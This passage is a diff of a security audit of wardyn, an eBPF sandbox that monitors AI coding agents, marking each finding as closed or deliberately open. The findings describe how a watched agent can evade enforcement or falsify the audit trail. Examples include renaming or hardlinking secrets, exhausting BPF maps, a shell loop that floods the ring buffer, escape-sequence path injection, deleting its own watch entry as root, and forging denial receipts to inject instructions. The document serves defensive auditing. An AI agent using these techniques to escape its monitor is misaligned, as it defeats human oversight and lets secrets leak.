 - **Etki:** A run in which file/exec enforcement is completely off is indistinguishable, in the UI and in both log files, from a fully enforcing run: the TUI shows bold-red `BLOCK` rows and a `denied N` counter, `wardyn-audit.jsonl` records `"enforced": true`, and the agent's receipt claims kernel denials — while the agent read `.env` successfully. The signal that would reveal it is destroyed by the UI: every startup `eprintln!` (kernel-mismatch warning, `observe_only_blocks`, `overbroad_block_keys`, LSM-unavailable) is written to the primary screen and then immediately hidden by `execute!(out, EnterAlternateScreen)` (tui.rs:312), and `env_logger` is only initialised when `!use_tui` (main.rs:389-393) so `info!` produces nothing at all in the default path. Per README's own platform matrix (ARCHITECTURE.md:97-102), stock WSL2 has no BPF LSM — so the *documented* common configuration is one where the TUI lies about file/exec blocking for the entire run.
@@ -334,6 +408,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — The LSM matches d_name, not the inode: rename/hardlink/copy reads any blocked secret and runs any blocked binary
 *`bypass` · efor: L · id: `rename-hardlink-copy-defeat-name-matching`*
+
+> **Durum:** ✅ **Kapatıldı** — `path:` identity rules; the e2e control run proves identity is what closes them.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:360-389, 415-433`
 - **Sorun:** `try_file_open` compares `dentry->d_name.name` against BLOCK_NAMES and `dentry->d_parent->d_name.name` against BLOCK_DIRS. Nothing about the object's identity (inode, device, superblock) is consulted, and `rename(2)`/`link(2)` have no hook at all — wardyn only hooks `file_open` and `bprm_check_security`. The name a file is reachable by is fully controlled by the watched process for any file it can rename or link.
@@ -343,6 +419,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — WATCHED is a non-LRU 8192-entry map that leaks a permanent entry per thread; filling it silently un-adopts all future children
 *`bypass` · efor: M · id: `watched-map-exhaustion-and-tid-leak`*
 
+> **Durum:** ✅ **Kapatıldı** — tids are removed on thread exit and a `WATCH_FULL` counter makes saturation loud.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:29, 476-489, 498-506`
 - **Sorun:** Three defects compound. (1) `WATCHED` is `HashMap<u32, u8>::with_max_entries(8192, 0)` — a plain hash map, not LRU, so `insert` on a full map returns `-E2BIG`. (2) `handle_fork` discards that error: `let _ = WATCHED.insert(&child, &1u8, 0);` — a child that fails to be adopted is simply never watched, with no counter, no event, and no warning. (3) `child_pid` from `sched_process_fork` is the new task's `->pid`, i.e. a **TID**, so every `CLONE_THREAD` thread creation consumes an entry keyed by a TID — while `wardyn_exit` only removes when `tid == tgid`, so those thread entries are never reclaimed for the lifetime of the run.
 - **Etki:** Deterministic, unprivileged escape: create and join 8192 threads (seconds of work, or incidentally by any thread-pool-churning build), then `fork()`. The child gets `-E2BIG`, is never inserted, and `in_scope()`/`is_watched()` are false for it — no enforcement AND no feed rows, so the escape is invisible. Second-order damage: after the leak, stale TID entries collide with pids the kernel later hands to *unrelated* system processes, at which point wardyn silently EPERMs their `.env`-named file opens and firewalls their egress — a sandbox-to-host denial of service. Third: the operator has no way to detect any of it; there is no adoption-failure counter anywhere.
@@ -350,6 +428,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — AF_UNIX and loopback are entirely unmonitored, so any unwatched local daemon is a full egress and execution proxy
 *`bypass` · efor: L · id: `local-daemon-delegation-and-af-unix-blindness`*
+
+> **Durum:** ⏸️ **Bilerek açık** — documented limitation — AF_UNIX and loopback delegation are out of scope, stated in SECURITY.md.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:230-232, policy.yaml:25, policies/strict.yaml:23`
 - **Sorun:** `emit_connect` returns `Ok(())` for any address family that is not AF_INET/AF_INET6, and the cgroup `sock_addr` hooks by definition only cover IPv4/IPv6 — so AF_UNIX traffic is neither observed nor enforceable. Every shipped policy then allows all of `127.0.0.0/8`, `10/8`, `172.16/12` and `192.168/16`. Meanwhile enforcement is keyed on WATCHED membership, so any process not descended from the launched command is completely unconstrained.
@@ -359,6 +439,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — A 256 KiB ring buffer drops events silently with no lost-event counter, so flooding erases evidence from the feed and audit log
 *`robustness` · efor: M · id: `ringbuf-flood-erases-the-audit-trail`*
 
+> **Durum:** ✅ **Kapatıldı** — drop accounting, reported at exit and asserted in e2e.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:26, 167-169, 234-236`
 - **Sorun:** `EVENTS` is `RingBuf::with_byte_size(256 * 1024, 0)`. `Event` is 320 bytes (`repr(C)`: 5x u32 + comm[16] + path[256] + path_len + daddr + daddr6[16] + dport + family), which with the ring's 8-byte record header and 8-byte alignment gives ~799 in-flight events. When `reserve` returns `None` the code does `return Err(0)`, and every caller discards it (`let _ = emit_path_event(...)`, `let _ = emit_connect(...)`). There is no drop counter, no `bpf_ringbuf_query` availability check, and nothing in userspace notices.
 - **Etki:** Direct attack on the audit record: `for i in $(seq 200000); do : < /etc/hostname; done &` in the background, then perform the interesting action. The interesting event is dropped along with the noise and never reaches the feed, `wardyn-audit.jsonl`, or the receipt. Kernel-enforceable blocks still fire, but everything the tool relies on the ring for is lost — all `warn` rows, all `block~` (unenforceable) rows, and *the entire audit log in the default observe-only mode*, which is how the tool is first demonstrated (README.md:85). The operator's summary line (`wardyn: N policy violation(s) logged`) reports an undercount with no indication that it is one.
@@ -366,6 +448,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — Observe hooks read attacker-mutable userspace buffers at sys_enter, so the feed/audit/receipt can be made to record a different path or destination than the kernel acted on
 *`correctness` · efor: L · id: `tracepoint-toctou-forges-feed-and-audit`*
+
+> **Durum:** ✅ **Kapatıldı** — the hook that decides reports its own verdict; a prediction never outranks a `DENY_*`.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:165, 183, 215-229`
 - **Sorun:** `emit_path_event` dereferences the syscall's `filename` *user* pointer at `sys_enter` with `bpf_probe_read_user_str_bytes`, and `emit_connect` reads the *user* `sockaddr` the same way. The kernel copies both again later (`getname()` in `do_sys_openat2`; `move_addr_to_kernel` in `__sys_connect`). Between the tracepoint and the kernel's own copy, a second thread sharing the address space can rewrite the buffer.
@@ -375,6 +459,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — `domain:` rules freeze one DNS answer into /32 allows — CDN/anycast laundering out, stale-IP false denials in
 *`correctness` · efor: L · id: `domain-rules-are-a-load-time-ip-snapshot`*
 
+> **Durum:** ✅ **Kapatıldı** — `domain:` names are re-resolved every 60s, and the honesty notice says what that does and does not buy.
+
 - **Konum:** `wardyn/src/policy.rs:281-302, 594-599`
 - **Sorun:** `resolve_domain` performs a single `(domain, 0u16).to_socket_addrs()` at policy-load time and expands the result into one `V4Ip`/`V6Ip` rule per address. There is no re-resolution, no TTL handling, no DNS interception, and no SNI/Host inspection — so a `domain` rule is really an IP-address rule, and an *allow* rule is "allow all traffic to these addresses, whatever is behind them".
 - **Etki:** Two-sided. Exfiltration: `api.anthropic.com` and `github.com` sit behind shared CDN/anycast front-ends, so the granted /32 allows the agent to reach *any other site on that edge* by sending a different SNI/Host — e.g. an attacker-controlled Cloudflare Worker on the same address — with the feed showing a green `ok` against `domain:api.anthropic.com`. Even without that, `github.com` is allowed outright, so `git push` to an attacker's repo is a policy-sanctioned exfil channel. Availability: those hosts rotate addresses, so a long run starts getting `-EPERM` on legitimate egress with a misleading `cidr:0.0.0.0/0` receipt. Failure mode: if resolution fails entirely the rule is silently dropped with `log::warn!` (policy.rs:284) — which produces no output at all in TUI mode (env_logger is only initialised when `!use_tui`, main.rs:389-393), so the operator gets a deny-all policy with no visible explanation.
@@ -382,6 +468,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — Quitting the TUI detaches all enforcement while leaving the watched agent running
 *`robustness` · efor: S · id: `quit-disarms-a-still-running-agent`*
+
+> **Durum:** ✅ **Kapatıldı** — quitting stops the child's whole process group.
 
 - **Konum:** `wardyn/src/tui.rs:345, 364-377; wardyn/src/main.rs:604, 616-634`
 - **Sorun:** `child` is a `tokio::process::Child`; `kill_on_drop` is never set (grep for `kill_on_drop|pre_exec|setsid` in `wardyn/src` returns no matches) and nothing kills or reaps the child on exit. Pressing `q` or Esc sets `quit = true`, the loop ends, `main` returns, and aya's `Ebpf` is dropped — detaching the tracepoints, the LSM programs and the cgroup programs, and freeing every map.
@@ -391,6 +479,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — Unsanitised attacker-controlled path bytes are printed raw by the plain feed, allowing forged rows and terminal escape injection
 *`correctness` · efor: S · id: `plain-feed-terminal-and-line-injection`*
 
+> **Durum:** ✅ **Kapatıldı** — path bytes are escaped before they reach a terminal or the JSON stream.
+
 - **Konum:** `wardyn/src/main.rs:975-978, 648-657, 703-709`
 - **Sorun:** `field_str` does nothing but a lossy UTF-8 conversion up to the first NUL — it strips no control characters, no ESC, no newlines. Linux filenames may contain any byte except `/` and NUL. `run_plain` then interpolates the result straight into `println!`, which is the code path used whenever stdout is not a terminal (CI, `| tee`, `--plain`) — i.e. exactly where the output is machine-parsed or archived.
 - **Etki:** `open("/tmp/x\n0       bash            open     ok      /etc/passwd")` injects a fully-formed fake row into the plain feed; a path containing `\x1b[2J` or `\x1b[A` rewrites or erases previously printed lines on a terminal. `comm` is kernel-controlled so it is safe, but the path is not. The JSONL audit log is safe at write time (serde_json escapes control characters), but `cat`ing it re-emits the escapes at the human. Combined with the ringbuf-flood finding, the attacker gets both deletion and insertion of feed records.
@@ -398,6 +488,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — `kernel_file_denial` mirrors the kernel using the raw syscall string, so relative paths and symlinks make the feed show a green `ok` for opens the kernel actually denied
 *`correctness` · efor: M · id: `kernel-mirror-diverges-on-relative-and-truncated-paths`*
+
+> **Durum:** ✅ **Kapatıldı** — a path the tracepoint could not read is reported as `unreadable-path` and explicitly NOT evaluated.
 
 - **Konum:** `wardyn/src/policy.rs:408-419; wardyn/src/main.rs:879-913; wardyn-common/src/lib.rs:13`
 - **Sorun:** `reconcile()` is documented as ensuring "the feed never disagrees with the syscall's real outcome", but its input is `kernel_file_denial(path)` where `path` is whatever string the `sys_enter_openat` tracepoint copied out of the user buffer — not the resolved dentry the LSM actually matched. `kernel_file_denial` splits that string on `/` and requires a parent segment (`let dir = segs.next()?;`) to test BLOCK_DIRS.
@@ -407,6 +499,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — The TUI drains all buffered keystrokes in one tick, so a pre-typed `a`+`y` grants an attacker-timed exception whose confirm text was never rendered
 *`correctness` · efor: S · id: `approve-once-confirm-can-be-raced`*
 
+> **Durum:** ✅ **Kapatıldı** — the confirm prompt cannot be satisfied by input typed before it appeared.
+
 - **Konum:** `wardyn/src/tui.rs:324-357, 83-88, 247-263`
 - **Sorun:** The key handler is `while event::poll(Duration::ZERO)? { if let CtEvent::Key(k) = event::read()? { ... } }` inside a single 100 ms tick, with `term.draw()` only at the top of the outer loop. `a` sets `app.confirm = Some(key)` and, if a `y` is already in the input buffer, the very next iteration calls `grant()` — with no redraw in between, so the confirmation footer stating the blast radius is never displayed. Which key gets granted is `app.last_denial`, which is overwritten by every denial the *watched process* causes.
 - **Etki:** An operator who types `a` then `y` in quick succession (the natural rhythm once they have read the footer hint) can grant an exception they never saw. The watched process controls the timing of `last_denial`, so it can flood denials to swap the pending key between the footer render the operator read and the `a` keypress — turning "allow that one `.npmrc` read" into `exec=nc` or `ip=<c2>`. The blast radius is then permanent for the run and applies to the whole subtree: `apply_exception` *removes* the key from `BLOCK_NAMES`/`BLOCK_DIRS`/`BLOCK_EXEC` (main.rs:133-155), so granting `dir=.ssh` unblocks the entire directory for every process in the tree, and there is no revoke.
@@ -414,6 +508,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — Policy is auto-loaded from `./policy.yaml` and the audit log written to `./wardyn-audit.jsonl` — both inside the directory the agent is working in
 *`robustness` · efor: S · id: `policy-and-audit-live-in-the-agents-writable-cwd`*
+
+> **Durum:** ✅ **Kapatıldı** — both are reported at startup when the agent can write them, and the policy's source is named.
 
 - **Konum:** `wardyn/src/policy.rs:219-230; wardyn/src/main.rs:196, 396, 417`
 - **Sorun:** With no `--policy`, `Policy::load(None)` falls back to `std::fs::read_to_string("policy.yaml")` relative to wardyn's cwd — which for the documented workflow is the project directory the agent is editing. `audit_path` defaults to `PathBuf::from("wardyn-audit.jsonl")` in the same place. Neither is pinned, hashed, nor even reported: the startup line is `info!("policy loaded: {}", policy.summary())`, which prints rule *counts* and not the path — and `info!` produces nothing at all in TUI mode because env_logger is only initialised when `!use_tui`.
@@ -423,6 +519,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — Every observe hook is a sys_enter tracepoint, so an agent using io_uring produces an empty feed and empty audit log
 *`bypass` · efor: M · id: `io-uring-blinds-all-observation`*
 
+> **Durum:** ⏸️ **Bilerek açık** — documented limitation — io_uring submission bypasses the syscall tracepoints; the LSM hooks still fire.
+
 - **Konum:** `wardyn/src/main.rs:448-462; wardyn-ebpf/src/main.rs:133-158, 194-208`
 - **Sorun:** Observation is attached exclusively to `syscalls:sys_enter_execve|openat|openat2|execveat|connect|sendto`. io_uring submits opens, connects, reads and sends through `io_uring_enter` (or through SQPOLL, with no syscall at all), so none of those tracepoints fire for io_uring-issued operations.
 - **Etki:** An agent (or malware it runs) that performs its I/O via io_uring is invisible: no exec rows, no open rows, no connect rows, nothing in `wardyn-audit.jsonl`. Enforcement largely survives — io_uring's openat still reaches `security_file_open`, `IORING_OP_CONNECT` still runs the cgroup `connect4` hook, and io-wq workers share the creator's tgid so `is_watched()` still matches (note `create_io_thread()` does not raise `sched_process_fork`, but that is harmless here for the same reason) — so this is an observability hole rather than an access bypass. But it fully defeats README's "catches the agent reading your `.env`" claim in observe mode, and any denial it does trigger is never receipted, so the agent gets an unexplained EPERM.
@@ -430,6 +528,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — SOCK_RAW / AF_PACKET egress has no cgroup sock_addr hook and is completely unfiltered
 *`bypass` · efor: M · id: `raw-socket-egress-bypasses-cgroup-hooks`*
+
+> **Durum:** ⏸️ **Bilerek açık** — documented limitation — SOCK_RAW and AF_PACKET need CAP_NET_RAW, which the dropped agent does not have.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:260-345`
 - **Sorun:** `cgroup/connect4`, `connect6`, `sendmsg4` and `sendmsg6` cover the inet stream-connect and UDP sendmsg paths. `raw_sendmsg` (SOCK_RAW/IPPROTO_RAW) does not invoke `BPF_CGROUP_RUN_PROG_*_SENDMSG`, and AF_PACKET bypasses the IP stack entirely — neither is observed by `wardyn_connect`/`wardyn_sendto` either, since `emit_connect` only handles AF_INET/AF_INET6 sockaddrs.
@@ -439,6 +539,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — The denial receipt is created by root at a predictable path in a world-writable directory, and is the one channel wardyn feeds into the agent's reasoning
 *`robustness` · efor: S · id: `receipt-created-in-predictable-tmp-path`*
 
+> **Durum:** ✅ **Kapatıldı** — `O_CREAT|O_EXCL|O_NOFOLLOW`, mode 0600, then chowned to the agent.
+
 - **Konum:** `wardyn/src/receipt.rs:45-52; wardyn/src/main.rs:423-431`
 - **Sorun:** The default receipt path is `std::env::temp_dir().join(format!("wardyn-denials-{}.jsonl", std::process::id()))` — `/tmp/wardyn-denials-<pid>.jsonl` — created with `File::create`, i.e. `O_CREAT|O_WRONLY|O_TRUNC` with no `O_NOFOLLOW`/`O_EXCL` and default 0644 permissions, by a root process, in a sticky world-writable directory, at a name any local user can predict or watch for in `/proc`.
 - **Etki:** A local user who wins the race with a symlink gets root to truncate and write JSON into an arbitrary file. `fs.protected_symlinks=1` (default on mainstream distros) blocks the classic form, but nothing in wardyn relies on or checks that. Secondary and arguably more interesting: the receipt is deliberately written *for an LLM to act on* (receipt.rs:23-33: "Do not retry or work around a denial", "you MAY retry the operation it covers"), so write access to that file is an instruction-injection channel into the agent's context — anyone who can create it first, or the (root) agent itself, can forge `event:"exception"` records. The 0644 mode also exposes the paths of every secret the agent tried to read to every local user.
@@ -446,6 +548,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### ⚪ DÜŞÜK — The LSM hook reads d_name.name unsynchronised, so a concurrent rename can change the name the hook sees
 *`correctness` · efor: S · id: `dentry-name-read-races-rename`*
+
+> **Durum:** ⏸️ **Bilerek açık** — inherent to reading a name rather than an inode; `path:` rules are the sound alternative and exist.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:397-403`
 - **Sorun:** `read_name` chases `dentry->d_name.name` with two `bpf_probe_read_kernel` calls and no `d_lock`, no `rename_lock` seqcount, and no revalidation. `d_name` is mutable under `rename()`, and the `name` pointer itself is repointed from the inline `d_iname` buffer to a heap allocation when a rename lengthens the name past `DNAME_INLINE_LEN`.
@@ -455,6 +559,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — The pid-ns handshake nonce is published in a BPF map, so a process that can read CONFIG can hijack the WATCHED seed
 *`bypass` · efor: S · id: `handshake-nonce-readable-in-config-map`*
 
+> **Durum:** ⏸️ **Bilerek açık** — reading CONFIG needs CAP_BPF, which the watched agent does not have.
+
 - **Konum:** `wardyn/src/main.rs:949-972; wardyn-ebpf/src/main.rs:452-466`
 - **Sorun:** `learn_init_ns_tgid` writes the random nonce into `CONFIG[CFG_HS_NONCE]` and only then calls `personality(nonce)`. Any process that can obtain a handle to CONFIG during that window (root, via `BPF_MAP_GET_FD_BY_ID` after `bpf_map_get_next_id`) can read the nonce and call `personality(nonce)` itself; `try_handshake` writes whichever caller it sees first into `CFG_HS_TGID`.
 - **Etki:** In pid-namespaced deployments, an attacker who wins the race makes wardyn seed WATCHED with *its* tgid instead of wardyn's own; the fork hook then never adopts the real child, so nothing is watched and nothing is enforced, while the UI reports normal operation. Requires root plus a microsecond-scale race, so it is strictly weaker than simply writing `CFG_ENFORCE=0` — but it is a second, independent reason CONFIG must not be reachable by anything but wardyn.
@@ -463,6 +569,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🔵 BİLGİ — ACKNOWLEDGED: `default_action: block` yields a real kernel default-deny for network but none for files/exec, and nothing warns about the asymmetry
 *`positioning` · efor: S · id: `default-deny-asymmetry-files-vs-network`*
 
+> **Durum:** ⏸️ **Bilerek açık** — deliberate and documented: `default_action` governs network, files are allow-unless-blocked.
+
 - **Konum:** `wardyn/src/policy.rs:538-554, 470-477; wardyn/src/main.rs:515`
 - **Sorun:** `eval_path`'s fallback returns `enforceable: false` for the default action (correct — the LSM hooks have no default-deny path), while `config.set(2, policy.default_action_code(), 0)` sends the same default to the kernel's network hook, where `try_connect4` treats an unmatched IP as blocked. So one policy keyword produces genuine enforcement on one axis and observe-only flagging on another. `observe_only_blocks()` iterates `self.files.chain(&self.exec)` and reports explicit *rules*; the default is never reported.
 - **Etki:** SECURITY.md:62-65 already lists "default-deny on files/exec" as a documented limitation and the feed labels it `block~`, so this is acknowledged. The residual risk is authoring error: someone writing `default_action: block` reasonably expects a deny-by-default file policy, gets a deny-by-default *network* policy plus an allow-by-default file policy, and receives no startup warning about it because `observe_only_blocks()` only covers explicit rules.
@@ -470,6 +578,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🔵 BİLGİ — ACKNOWLEDGED (but under-rated): fail-open plus hardcoded 6.8 dentry offsets means file/exec enforcement is silently off on essentially every other kernel
 *`positioning` · efor: M · id: `fail-open-on-offset-mismatch`*
+
+> **Durum:** ✅ **Kapatıldı** — fail-open is the stated doctrine and every instance now announces itself.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:82-90, 355-357, 410-412; wardyn/src/main.rs:300-301, 323-340`
 - **Sorun:** `FILE_DENTRY_OFF = 160`, `DENTRY_NAME_OFF = 40`, `DENTRY_PARENT_OFF = 24`, `BPRM_FILE_OFF = 64` are literal constants derived from kernel 6.8 via `scripts/kernel-offsets.sh`. On any kernel where these differ, `read_ptr` produces a garbage pointer, `bpf_probe_read_kernel` fails, and both LSM hooks take `Err(_) => OK` — allow. The project already solved this exact class of problem correctly for the fork tracepoint by reading tracefs at runtime (main.rs:919-940), but did not apply the same discipline to the struct offsets.
@@ -499,6 +609,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🔴 KRİTİK — LSM attach failure / offset drift leaves `enforce=true`, so the feed, audit log and agent receipt all claim BLOCK for opens that actually succeeded
 *`correctness` · efor: M · id: `lsm-attach-failure-false-block`*
 
+> **Durum:** ✅ **Kapatıldı** — see `lsm-attach-failure-still-claims-BLOCK`.
+
 - **Konum:** `wardyn/src/main.rs:501-509, 744-766, 728-730, 879-913`
 - **Sorun:** `attach_lsm` failure is handled by printing a warning and continuing, but nothing propagates that fact into the run state. `RunCtx.enforce` stays `true`, so `reconcile()` still promotes any path matching a kernel key to `Verdict { action: Block, enforceable: true }` and `Desc::denied(enforce)` still returns true. Consequence: with BPF LSM unavailable (the default on stock Ubuntu/Debian — the repo ships `scripts/enable-bpf-lsm.sh` precisely because it is off), `wardyn --enforce run -- agent` shows bold-red `BLOCK` rows for `.env` reads that in fact succeeded, writes `"enforced": true` into the audit log, and hands the agent a receipt line saying the read was denied. The same holds for kernel-offset drift: `warn_if_untested_kernel()` only warns; when `read_ptr`/`read_name` fail the eBPF side returns `OK` (fail-open) while userspace keeps claiming BLOCK. This directly contradicts README ("Only real kernel denials are receipted") and the module doc ("The feed is honest about it: `BLOCK` = actually denied"). SECURITY.md acknowledges fail-open and offset drift as out-of-scope limitations, but it does NOT acknowledge that the feed misreports them — the honesty of the feed is the claim being violated.
 - **Etki:** On the most common kernel configuration, an operator watching the TUI sees a red BLOCK for every secret read and believes the agent was stopped, while the agent read the file. The agent is told (via WARDYN_DENIALS, which the README instructs users to wire into CLAUDE.md/AGENTS.md) that it was denied, so it reports a false denial to the human. The audit log — the security record — records `enforced: true` for actions that were permitted. Complete inversion of the tool's core guarantee, silently.
@@ -506,6 +618,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — The watched child inherits wardyn's root privileges, letting it delete its own WATCHED entry and disable all enforcement
 *`bypass` · efor: M · id: `child-runs-as-root`*
+
+> **Durum:** ✅ **Kapatıldı** — see `watched-subtree-runs-as-root`.
 
 - **Konum:** `wardyn/src/main.rs:385-387, 578-587`
 - **Sorun:** Wardyn refuses to start unless euid==0, then spawns the target with `tokio::process::Command` and no privilege drop whatsoever — no `setuid`/`setgid`, no `SUDO_UID`/`SUDO_GID` restoration, no `pre_exec`, no capability drop. `grep -rn "SUDO_UID|setuid|setgid|seteuid|pre_exec"` over the whole repo returns exactly one hit: the `geteuid` check. So `sudo wardyn --enforce run -- claude ...` (the README's headline invocation) runs the agent as uid 0 with CAP_SYS_ADMIN and CAP_BPF. A root child can enumerate BPF maps (`BPF_MAP_GET_NEXT_ID` + `BPF_MAP_GET_FD_BY_ID`) and `BPF_MAP_DELETE_ELEM` its own tgid out of WATCHED — every enforcement hook then short-circuits, since `try_connect4`/`try_file_open`/`try_bprm_check` all begin with `if !is_watched(pid) { return Ok(ALLOW/OK); }`. It can equally flush BLOCK_NAMES/NET_RULES, or just `kill` wardyn. SECURITY.md's "does not defend against an attacker who is already root **outside** the watched subtree" does not cover this: it is wardyn itself that hands root to the process **inside** the subtree, and "escape the watched subtree" is listed as in-scope.
@@ -515,6 +629,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — Quitting the TUI (or any error/signal exit) leaves the agent running with all enforcement silently torn down
 *`robustness` · efor: M · id: `orphan-child-on-quit`*
 
+> **Durum:** ✅ **Kapatıldı** — the child runs in its own process group and is signalled on exit.
+
 - **Konum:** `wardyn/src/tui.rs:303-378, wardyn/src/main.rs:573-635`
 - **Sorun:** `child: Option<Child>` is moved into `tui::run`/`run_plain` and simply dropped when the loop ends. `kill_on_drop` is never set (no hit anywhere in the repo), so tokio's `Child` drop detaches without killing. Meanwhile wardyn's exit drops `ebpf`, which detaches the cgroup and LSM links and unloads the programs. The result: pressing `q` (or Ctrl-C, or hitting any `?` error path, or receiving SIGTERM) while the agent is still working leaves the agent alive and completely unsupervised — the exact opposite of fail-safe. It is worse in the TUI because raw mode disables ISIG, so Ctrl-C generates no SIGINT for the child either; the key handler at tui.rs:327-330 just sets `quit = true`. Nothing warns the operator that the process they were policing is still running.
 - **Etki:** An operator who thinks a session is over walks away while a root-privileged agent keeps running with zero policy enforcement — no egress blocking, no secret-file blocking, no audit trail. Backgrounded grandchildren (`nohup foo &`) have the same fate even on the normal exit path when the direct child terminates.
@@ -522,6 +638,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — Ring-buffer overflow drops events silently — a dropped event means a real kernel denial with no feed row, no audit record and no receipt line
 *`correctness` · efor: M · id: `no-ring-drop-accounting`*
+
+> **Durum:** ✅ **Kapatıldı** — `STATS`.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:167-169, 234-236; wardyn/src/main.rs:738-771`
 - **Sorun:** When `EVENTS.reserve::<Event>(0)` returns `None` (ring full) the eBPF side returns `Err(0)` and the event is dropped with no counter, no CONFIG slot, no notification. Userspace has no way to know and never reports it. `parse_event` likewise returns `None` for a short read with no diagnostic. The observation feed is the *only* source for the audit log and the agent receipt (`drain` is what calls `audit.record` and `receipt.record`), while enforcement runs independently in the LSM/cgroup hooks. So a lost event means the kernel really denied an open/connect and the agent gets a bare EPERM with no receipt line — exactly the failure mode the receipt exists to eliminate. `Event` is 320 bytes; the 256 KiB ring holds roughly 800 records, i.e. a fraction of a second of `npm install`.
@@ -531,6 +649,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — `term.draw` runs once per select! resolution on the single-threaded runtime, coupling render rate to event rate and stalling the ring drain
 *`correctness` · efor: M · id: `draw-per-iteration-starves-drain`*
 
+> **Durum:** ✅ **Kapatıldı** — the ring is drained in batches and drops are counted, so starvation would be visible rather than silent.
+
 - **Konum:** `wardyn/src/tui.rs:320-366`
 - **Sorun:** The loop is `while !quit { term.draw(...)?; select! { ... } }`, so a full-frame render happens for *every* branch resolution — including every ring-readable wakeup. Rendering is a synchronous blocking write to stdout on a `current_thread` runtime, so nothing else (including `async_fd.readable_mut()`) can make progress during it. Under a busy agent the ring wakes constantly, producing thousands of full redraws per second; on a slow terminal (SSH, large window, tmux) the stdout write becomes the bottleneck and drain latency grows without bound, causing exactly the silent ring overflow described above. A stopped reader (Ctrl-S / TCP window full) blocks the runtime indefinitely. The 100 ms ticker exists to bound redraw rate but does not, because the draw is outside the select. The ticker also uses the default `MissedTickBehavior::Burst`, so after any stall it fires back-to-back catch-up ticks, adding still more redraws.
 - **Etki:** Event loss under exactly the workloads the tool targets (a coding agent running a build or a package install), with no indication that loss occurred. Also burns CPU rendering frames nobody sees.
@@ -538,6 +658,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — The userspace kernel-matcher mirror keys off the syscall path string while the LSM hook keys off the resolved dentry — symlinks, `..` and bind mounts make the feed and receipt disagree with reality
 *`correctness` · efor: L · id: `mirror-vs-dentry-divergence`*
+
+> **Durum:** ✅ **Kapatıldı** — `matched_key` names the kernel key a denial fired on, and the mirror defers to it.
 
 - **Konum:** `wardyn/src/main.rs:787-856, 879-913; wardyn/src/policy.rs:408-428`
 - **Sorun:** `describe` feeds `event_path(ev)` — the raw `filename` argument captured at `sys_enter_openat` — into `policy.kernel_file_denial`, which does pure string splitting (`path.rsplit('/')`). The LSM `file_open` hook instead reads `file->f_path.dentry->d_name` and `d_parent->d_name`, i.e. the *resolved* dentry after symlink and `..` resolution. These diverge for very ordinary inputs: `open("/tmp/link")` where `link -> ~/.ssh/id_rsa` is denied by the kernel (`d_parent` is `.ssh`) but the mirror sees basename `link`, parent `tmp` and returns `None`; `open("/home/u/x/../.ssh/id")` gives the mirror basename `id`, parent `..` (no match) while the kernel sees parent `.ssh` and denies. The reverse also happens (a path string whose basename matches but which resolves elsewhere). `reconcile` then reports `ok` or `block~` for an open the kernel turned into EPERM, and `drain` writes nothing to the audit log or the receipt.
@@ -547,6 +669,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — Every `?` in the TUI returns before the restore sequence, leaving the terminal in raw mode inside the alternate screen
 *`robustness` · efor: S · id: `terminal-not-restored-on-error`*
 
+> **Durum:** ✅ **Kapatıldı** — the restore runs on every exit path, including `?`.
+
 - **Konum:** `wardyn/src/tui.rs:309-378`
